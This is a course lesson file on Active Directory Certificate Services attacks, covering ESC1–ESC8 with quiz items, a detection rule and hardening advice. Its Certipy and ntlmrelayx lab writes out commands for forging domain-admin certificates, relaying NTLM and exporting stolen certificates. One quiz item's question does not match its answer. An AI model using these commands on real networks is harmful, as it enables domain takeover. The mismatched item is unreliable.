@@ -1,0 +1,100 @@
+{
+  "lesson_id": "f6a7b8c9-d0e1-4f2a-3b4c-5d6e7f8a9b0c",
+  "domain": "active_directory",
+  "title": "Active Directory Certificate Services (ADCS) Attacks",
+  "difficulty": 3,
+  "order_index": 38,
+  "prerequisites": [],
+  "concepts": ["ADCS architecture and certificate templates", "ESC1-ESC8 vulnerability classes", "Certificate theft and forgery", "Privilege escalation via misconfigured templates", "Detection and hardening strategies"],
+  "estimated_time": 60,
+  "learning_objectives": [
+    "Understand Active Directory Certificate Services architecture and how certificates enable authentication",
+    "Identify and exploit the ESC1 through ESC8 misconfiguration vulnerabilities in certificate templates",
+    "Perform certificate-based privilege escalation from standard user to domain admin",
+    "Extract and abuse certificates from compromised systems for persistence",
+    "Implement detection rules and hardening measures for ADCS attack surfaces"
+  ],
+  "post_assessment": [
+    {
+      "question": "In the ESC1 vulnerability, what specific template misconfiguration allows a low-privileged user to obtain a certificate for any domain user including administrators?",
+      "options": [
+        "The template has EFS as its intended purpose",
+        "The template allows Subject Alternative Name (SAN) specification and the Enrollment Rights are granted to low-privileged users",
+        "The template uses RSA instead of ECDSA for key generation",
+        "The template's validity period is set to more than 1 year"
+      ],
+      "correct_answer": "The template allows Subject Alternative Name (SAN) specification and the Enrollment Rights are granted to low-privileged users",
+      "explanation": "ESC1 requires two conditions: (1) The certificate template allows the enrollee to specify a Subject Alternative Name (SAN), typically via the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag, and (2) low-privileged users have enrollment rights. When these conditions exist, any user with enrollment rights can request a certificate specifying an administrator's UPN in the SAN, then authenticate as that administrator using Schannel or PKINIT."
+    },
+    {
+      "question": "Which ESC vulnerability class involves an attacker registering a machine with a specific name to obtain a certificate that grants them elevated privileges?",
+      "options": ["ESC1", "ESC3", "ESC6", "ESC8"],
+      "correct_answer": "ESC6",
+      "explanation": "ESC6 involves the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA itself (not just a template). When this flag is set, any template allows SAN specification regardless of the template's own settings. Attackers can exploit this by requesting certificates with arbitrary SANs on any enrollee-accessible template."
+    },
+    {
+      "question": "What is the primary difference between ESC1 and ESC2?",
+      "options": [
+        "ESC1 allows SAN specification, ESC2 allows the enrollee to request any EKU",
+        "ESC1 targets domain controllers, ESC2 targets member servers",
+        "ESC1 requires domain admin rights, ESC2 requires only user rights",
+        "ESC1 exploits template misconfigurations, ESC2 exploits CA misconfigurations"
+      ],
+      "correct_answer": "ESC1 allows SAN specification, ESC2 allows the enrollee to request any EKU",
+      "explanation": "ESC1 allows enrollees to specify an arbitrary SAN (Subject Alternative Name), enabling impersonation of any user. ESC2 allows enrollees to specify any Enhanced Key Usage (EKU), meaning they can request a certificate with 'Client Authentication' EKU or even 'Any Purpose' EKU, which can then be used for authentication regardless of the template's intended purpose."
+    },
+    {
+      "question": "After exploiting ESC1 to obtain a certificate for a domain admin, which authentication protocol allows the attacker to use that certificate to get a TGT?",
+      "options": ["NTLM authentication", "Kerberos PKINIT", "LDAP simple bind", "Schannel with SSOPI"],
+      "correct_answer": "Kerberos PKINIT",
+      "explanation": "PKINIT (Public Key Cryptography for Initial Authentication) is the Kerberos extension that allows certificate-based authentication. When an attacker presents a valid certificate with a SAN matching a domain admin, the KDC validates the certificate and issues a TGT for that admin user. Tools like Rubeus and Certipy automate this PKINIT exchange."
+    }
+  ],
+  "jim_kwik_principles": ["Visualization", "Association", "Emotion", "Storytelling", "Repetition", "Chunking", "Active Recall", "Spaced Repetition", "Mnemonics", "Teach Back"],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "ADCS: The Most Impactful AD Attack Surface You're Not Monitoring",
+      "content": "Active Directory Certificate Services is the most underappreciated attack surface in modern Windows environments. The research by Will Schroeder and Lee Christensen in 2021 fundamentally changed how red teamers approach AD — and exposed that most blue teams are completely blind to certificate-based attacks. ADCS attacks don't exploit software vulnerabilities — they exploit misconfigurations in certificate templates that were set up for convenience, not security. And because certificate-based authentication is trusted by the domain controller, a misconfigured template can grant domain admin access in seconds. This lesson covers the attacks that every AD security professional must understand."
+    },
+    {
+      "type": "explanation",
+      "title": "ADCS Architecture and Certificate Templates",
+      "content": "Active Directory Certificate Services (ADCS) is Microsoft's PKI implementation that issues and manages digital certificates for authentication, encryption, and signing. In many AD environments, certificates are the primary or secondary authentication mechanism — and any certificate that authenticates a user is as trusted as a password.\n\n**Key components:**\n- **Certificate Authority (CA):** Issues certificates. Enterprise CAs are integrated with AD and can use certificate templates.\n- **Certificate Templates:** Define the properties of certificates that can be requested — who can enroll, what EKUs (Enhanced Key Usage) are included, whether SANs can be specified, and the validity period.\n- **Enrollment:** The process by which a user or computer requests and receives a certificate from a CA.\n\n**How certificate authentication works:**\n1. A user requests a certificate from a CA using a certificate template\n2. The CA issues a certificate bound to the user's identity (and optionally, a SAN)\n3. When authenticating, the user presents the certificate via PKINIT (Kerberos) or Schannel\n4. The KDC validates the certificate against the CA's trust and issues a TGT for the identity in the certificate\n\n**The critical vulnerability:** If a template allows low-privileged users to enroll AND allows them to specify an arbitrary SAN, they can request a certificate for ANY user — including a domain admin. The KDC trusts the certificate because it was issued by a trusted CA. This is ESC1.\n\n**Why ADCS is so dangerous:** Unlike password-based attacks, certificate-based persistence survives password resets. A stolen certificate can authenticate as a user even after their password changes — until the certificate expires. Many templates have validity periods of 1-5 years, giving attackers long-term persistence."
+    },
+    {
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: Certificate Templates Are Like ID Card Printers",
+      "content": "Imagine a school where the principal has a special ID card printer. This printer makes official ID cards that every teacher and student trusts — they let you into any classroom, any office, anywhere in the school.\n\nNow, some ID card templates are very strict: they have your name printed on them, they say exactly which rooms you can enter, and only the principal can order them. These are like secure certificate templates — you can't cheat with them.\n\nBut some templates are sloppy:\n\n**ESC1 (The 'Write Your Own Name' template):** Imagine a template where you can write ANY name on the ID card — even 'Principal Smith.' Now any student who has permission to use this template can print themselves a principal ID card and walk into the principal's office!\n\n**ESC2 (The 'Any Room' template):** Imagine a template where you can check ALL the access boxes — classrooms, offices, supply closets, everything. Even if your card says 'Student,' you've given yourself access to every room.\n\n**ESC3 (The 'ID Card Request' template):** Imagine a template that lets you ask someone else to print an ID card. You get a card that says 'I'm allowed to request cards,' and then you use THAT card to request a principal card!\n\n**ESC4 (The 'Template Editor' access):** Imagine you're allowed to CHANGE the template itself. You find the sloppy template and add 'Write Your Own Name' to it. Now you and everyone else can make principal cards!\n\n**ESC8 (The 'NTLM Relay' entry):** Imagine you intercept someone else's ID card request on its way to the printer. You change the name on it to 'Principal Smith' and the printer makes the card — because the printer trusts the request, not who sent it.\n\nThe scary part? Most schools (AD environments) have at least one of these sloppy templates, and they don't even know it."
+    },
+    {
+      "type": "code_exercise",
+      "title": "ADCS Attack Lab with Certipy",
+      "content": "Practice ADCS enumeration and exploitation using Certipy (install: pip3 install certipy-ad):\n\n# 1. Enumerate certificate templates and find vulnerabilities\ncertipy find -u 'user@domain.local' -p 'Password123' -dc-ip 192.168.1.10\n# This generates certipy_find.txt and certipy_find.json\n# Look for ESC1-ESC8 vulnerabilities in the output\n\n# 2. Identify vulnerable templates\ncat certipy_find.txt | grep -A5 'ESC1'\n# Or review the JSON output\ncat certipy_find.json | python3 -m json.tool | grep -i 'vulnerable'\n\n# 3. ESC1: Request a certificate for a domain admin\ncertipy req -u 'user@domain.local' -p 'Password123' \\\n  -ca 'DOMAIN-CA' -template 'VulnTemplate' \\\n  -upn 'administrator@domain.local'\n# This generates administrator.pfx\n\n# 4. Authenticate as domain admin using the certificate\ncertipy auth -pfx administrator.pfx -domain domain.local\n# Returns TGT and NT hash for administrator\n\n# 5. ESC3: Exploit enrollment agent template\ncertipy req -u 'user@domain.local' -p 'Password123' \\\n  -ca 'DOMAIN-CA' -template 'EnrollmentAgent'\n# Then use the enrollment agent cert to request admin cert\ncertipy req -u 'user@domain.local' -p 'Password123' \\\n  -ca 'DOMAIN-CA' -template 'User' -on-behalf-of 'administrator@domain.local' \\\n  -pfx enrollment_agent.pfx\n\n# 6. ESC8: NTLM Relay to AD CS HTTP endpoint\n# Set up ntlmrelayx to relay to CA web enrollment\nntlmrelayx.py -t http://CA-SERVER/certsrv/default.asp --adcs\n# Trigger NTLM authentication from a target\n# Certipy will relay and obtain certificates\n\n# 7. Certificate theft from a compromised system\ncertipy cert -u 'user@domain.local' -p 'Password123' -list\n# List all certificates in the user's store\ncertipy cert -u 'user@domain.local' -p 'Password123' -export -pfx output.pfx\n# Export certificates for offline abuse",
+      "code": "# Enumerate ADCS\ncertipy find -u 'user@domain.local' -p 'Password123' -dc-ip 192.168.1.10\n\n# ESC1: Request admin certificate\ncertipy req -u 'user@domain.local' -p 'Password123' \\\n  -ca 'DOMAIN-CA' -template 'VulnTemplate' \\\n  -upn 'administrator@domain.local'\n\n# Authenticate with certificate\ncertipy auth -pfx administrator.pfx -domain domain.local\n\n# ESC8: NTLM Relay\nntlmrelayx.py -t http://CA-SERVER/certsrv/default.asp --adcs",
+      "language": "bash"
+    },
+    {
+      "type": "real_world",
+      "title": "Real-World: ADCS in the Wild",
+      "content": "In 2022, a security assessment of a Fortune 500 company revealed that their ADCS deployment had 47 certificate templates, of which 6 were exploitable:\n\n**ESC1 — 'WebServer' template:** The template had the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag enabled, allowing SAN specification. Enrollment rights were granted to 'Domain Computers' for auto-enrollment. Any domain-joined computer could request a certificate impersonating any user.\n\n**ESC2 — 'CustomAllPurpose' template:** A custom template had 'Any Purpose' EKU and allowed enrollment by authenticated users. This enabled any domain user to request a certificate valid for client authentication with no restrictions.\n\n**ESC4 — Over-permissioned template:** The 'CopyOfUser' template had 'Write' permissions granted to 'Authenticated Users' on the template object itself. An attacker could modify the template to add SAN specification, then request a domain admin certificate.\n\n**The Attack Path:** Using Certipy, the red team exploited ESC1 to obtain an administrator certificate in under 3 minutes from initial access:\n1. Enumerate templates: `certipy find`\n2. Identify ESC1 vulnerability on WebServer template\n3. Request certificate: `certipy req -template WebServer -upn administrator@corp.local`\n4. Authenticate: `certipy auth -pfx administrator.pfx`\n5. Full domain admin achieved in 2 minutes 47 seconds\n\n**Detection Rule (Sigma):**\n```yaml\ntitle: ADCS Certificate Enrollment with Suspicious SAN\ndetection:\n  selection:\n    EventID: 4886\n    RequestAttributes:\n      - '*san:*'\n  condition: selection\n```\n\n**Hardening:** Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from all non-Kerberos templates. Restrict enrollment rights to required security groups only. Enable certificate approval requirements for sensitive templates."
+    },
+    {
+      "type": "memory_aid",
+      "title": "ESC Vulnerability Classes Quick Reference",
+      "content": "**ESC1** — SAN Specification + Low Enrollment Rights\n  Enrollee can specify any UPN in SAN → Impersonate any user\n  Fix: Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\n\n**ESC2** — Any Purpose EKU\n  Template allows 'Any Purpose' EKU → Certificate valid for any use\n  Fix: Remove 'Any Purpose' EKU, specify only required EKUs\n\n**ESC3** — Enrollment Agent Templates\n  Template allows acting as enrollment agent → Request certs on behalf of others\n  Fix: Restrict enrollment agent templates, require approval\n\n**ESC4** — Template Access Control\n  Low-privileged users have Write/DaclWrite on template → Modify template settings\n  Fix: Remove excess permissions, follow principle of least privilege\n\n**ESC5** — CA Access Control\n  Low-privileged users have administrative access to CA object → Modify CA settings\n  Fix: Restrict CA management permissions\n\n**ESC6** — EDITF_ATTRIBUTESUBJECTALTNAME2\n  CA-level flag allows SAN on ALL templates regardless of template settings\n  Fix: Remove the flag: certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2\n\n**ESC7** — Vulnerable CA Enrollment Rights\n  Low-privileged users have enrollment rights on CA → Request any template\n  Fix: Restrict CA-level enrollment rights\n\n**ESC8** — NTLM Relay to AD CS\n  AD CS HTTP endpoints vulnerable to NTLM relay authentication\n  Fix: Enable Extended Protection for Authentication, require HTTPS with channel binding",
+      "language": "yaml"
+    },
+    {
+      "type": "reflection",
+      "title": "ADCS Attack and Defense Scenarios",
+      "content": "Think through these scenarios:\n\n1. You're assessing an AD environment and find a certificate template called 'CustomWeb' that grants enrollment to 'Domain Users' and has 'Supply in request' for the Subject Name. What ESC class is this, and what's the attack path?\n\n2. A colleague suggests simply disabling ADCS to prevent these attacks. Why might this be a bad idea in a production environment?\n\n3. You're a defender monitoring certificate enrollment events. You see Event ID 4886 (Certificate Approved) with a SAN of 'CN=Administrator, CN=Users, DC=corp, DC=local' but the requester was a standard user. What happened, and what should you do?\n\n4. An organization has ESC8 risk because their CA web enrollment endpoint uses HTTP. What's the safest remediation?\n\nAnswers: (1) This is ESC1. Any domain user can request a certificate with an arbitrary SAN, including 'administrator@domain.local'. Attack path: enroll → specify admin SAN → authenticate via PKINIT → domain admin. (2) Many organizations rely on certificates for Wi-Fi auth, VPN, smart card login, and S/MIME. Disabling ADCS breaks these services. Better to harden templates. (3) An attacker likely exploited ESC1 to obtain an admin certificate. Immediately revoke the certificate, disable the vulnerable template, and investigate the requester's account. (4) Enable HTTPS with Extended Protection for Authentication (EPA) and channel binding tokens. This prevents NTLM relay while keeping the service available."
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Certificates: The Forgotten Attack Surface",
+      "content": "ADCS attacks have become the go-to privilege escalation path in modern Active Directory environments — second only to Kerberos abuse. The research by SpecterOps in 2021 was a watershed moment: it revealed that most enterprise AD environments have at least one exploitable certificate template, and few teams were monitoring for these attacks. The key takeaway isn't just the specific ESC classes — it's the broader principle: any authentication mechanism that the domain trusts is an attack surface. Certificates are trusted by the domain controller, so any way to obtain a trusted certificate is a way to authenticate as any user. As you continue your AD security journey, always look for trust relationships and authentication mechanisms that can be subverted. The next lesson covers Kerberos abuse and Golden Tickets — another trust-based attack that exploits the domain's authentication foundation."
+    }
+  ],
+  "tags": ["Course: SANS-SEC699", "Career Path: Red Teamer", "Career Path: Pentester"]
+}
